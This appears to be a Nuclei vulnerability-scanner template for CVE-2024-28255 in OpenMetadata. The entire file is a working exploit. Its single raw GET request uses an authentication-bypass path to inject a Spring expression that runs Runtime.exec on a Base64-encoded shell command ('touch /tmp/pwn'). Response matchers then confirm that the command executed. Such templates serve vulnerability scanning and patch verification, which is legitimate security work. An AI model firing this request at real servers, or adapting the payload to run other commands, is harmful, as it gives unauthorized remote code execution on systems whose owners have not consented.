id: CVE-2024-28255

info:
  name: OpenMetadata Command Execution
  author: jakabakos
  severity: high
  description: This template exploits a command execution vulnerability in OpenMetadata.
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true

requests:
  - raw:
      - |
        GET /api/v1;v1%2Fv1%2Fusers%2Flogin/events/subscriptions/validation/condition/T%28java.lang.Runtime%29.getRuntime%28%29.exec%28new%20java.lang.String%28T%28java.util.Base64%29.getDecoder%28%29.decode%28%22dG91Y2ggL3RtcC9wd24%3D%22%29%29%29 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
        Connection: close
        Accept-Encoding: gzip

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Failed to evaluate - EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.Boolean"
        condition: and
      - type: status
        status:
          - 400
